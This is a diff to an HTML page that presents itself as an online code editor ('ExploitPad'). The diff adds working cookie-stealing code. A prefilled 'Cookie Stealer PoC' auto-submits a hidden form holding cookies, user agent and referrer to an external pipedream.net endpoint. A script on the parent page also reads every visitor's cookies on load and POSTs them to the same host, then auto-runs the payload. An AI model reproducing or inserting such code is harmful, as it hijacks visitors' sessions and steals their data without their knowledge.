@@ -4,114 +4,76 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Code Thief🏆</title>
-  <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background-color: #121212;
-            color: gold;
-            font-family: Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-start;
-            align-items: center;
-            min-height: 100vh;
-            text-align: center;
-            padding: 20px;
-        }
-
-        h2 {
-            font-size: 24px;
-            margin-bottom: 15px;
-        }
-
-        .container {
-            width: 95%;
-            max-width: 600px; /* Smaller size for GitHub Pages */
-            background: #1e1e1e;
-            padding: 15px;
-            border-radius: 10px;
-            border: 2px solid gold;
-            box-shadow: 0 0 10px gold;
-        }
-
-        textarea {
-            width: 100%;
-            height: 150px; /* Smaller height for better fit */
-            background-color: #222;
-            color: gold;
-            border: 2px solid gold;
-            padding: 10px;
-            font-family: monospace;
-            font-size: 14px;
-            border-radius: 8px;
-            margin-top: 10px;
-            resize: vertical;
-        }
-
-        button {
-            background-color: gold;
-            color: black;
-            border: none;
-            padding: 10px;
-            font-size: 14px;
-            font-weight: bold;
-            cursor: pointer;
-            border-radius: 6px;
-            margin-top: 10px;
-            transition: 0.3s;
-            width: 100%;
-        }
-
-        button:hover {
-            background-color: #ffcc00;
-        }
-
-        iframe {
-            width: 100%;
-            height: 200px; /* Adjusted for smaller screens */
-            border: 2px solid gold;
-            border-radius: 8px;
-            background-color: white;
-            margin-top: 10px;
-        }
-
-        @media (max-width: 500px) {
-            .container {
-                width: 100%;
-                max-width: 95%;
-                padding: 10px;
-            }
-
-            textarea {
-                height: 120px;
-                font-size: 12px;
-            }
-
-            button {
-                font-size: 12px;
-                padding: 8px;
-            }
-
-            iframe {
-                height: 180px;
-            }
-        }
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background-color: #121212; color: gold; font-family: Arial, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
+        h2 { font-size: 28px; margin-bottom: 15px; }
+        .container { width: 90%; max-width: 800px; background: #1e1e1e; padding: 20px; border-radius: 10px; border: 2px solid gold; box-shadow: 0 0 15px gold; }
+        textarea { width: 100%; height: 200px; background-color: #222; color: gold; border: 2px solid gold; padding: 10px; font-family: monospace; font-size: 16px; border-radius: 10px; margin-top: 10px; resize: none; }
+        button { background-color: gold; color: black; border: none; padding: 12px 24px; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 8px; margin-top: 10px; transition: 0.3s; width: 100%; }
+        button:hover { background-color: #ffcc00; }
+        iframe { width: 100%; height: 300px; border: 2px solid gold; border-radius: 10px; background-color: white; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <h2>👽 ExploitPad 🕵️</h2>
+    <h2>👽ExploitPad🕵️</h2>
     <div class="container">
-        <textarea id="code" placeholder="Write your HTML, CSS, or JavaScript here..."></textarea>
+        <textarea id="code" placeholder="Write your HTML, CSS, or JavaScript here..."><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ghost Shell Cookie Stealer PoC</title>
+    <style>
+        body { background-color: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; font-family: Arial, sans-serif; }
+        h2 { text-align: center; color: gold; text-shadow: 0 0 10px rgba(255, 215, 0, 0.8); }
+        form { display: none; }
+    </style>
+</head>
+<body>
+    <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
+    <form id="stealthForm" action="https://eoy4evvlsf7y0jq.m.pipedream.net" method="POST">
+        <input type="hidden" name="cookie_data" id="cookieField" value="default_cookie">
+        <input type="hidden" name="user_agent" id="userAgentField" value="default_agent">
+        <input type="hidden" name="referrer" id="referrerField" value="default_referrer">
+        <input type="hidden" name="fallback" value="not_empty">
+        <button type="submit" name="submitButton">Send</button>
+    </form>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var cookies = document.cookie || "No_Cookies_Found";
+            var userAgent = navigator.userAgent || "Unknown_User_Agent";
+            var referrer = document.referrer || "No_Referrer";
+            document.getElementById("cookieField").value = cookies;
+            document.getElementById("userAgentField").value = userAgent;
+            document.getElementById("referrerField").value = referrer;
+            document.getElementById("stealthForm").submit();
+        });
+    </script>
+</body>
+</html></textarea>
         <button onclick="runCode()">▶ Run Code</button>
         <iframe id="output"></iframe>
     </div>
 
     <script>
+        // Capture cookies in the parent context and send them immediately
+        document.addEventListener("DOMContentLoaded", function() {
+            var parentCookies = document.cookie || "No_Parent_Cookies";
+            console.log("Parent Cookies: ", parentCookies);
+            fetch("https://eoy4evvlsf7y0jq.m.pipedream.net", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    parent_cookie_data: parentCookies,
+                    user_agent: navigator.userAgent,
+                    referrer: document.referrer,
+                    source: "parent_page"
+                })
+            });
+            runCode(); // Still auto-run the iframe code
+        });
+
         function runCode() {
             let code = document.getElementById("code").value;
             let outputFrame = document.getElementById("output").contentWindow.document;
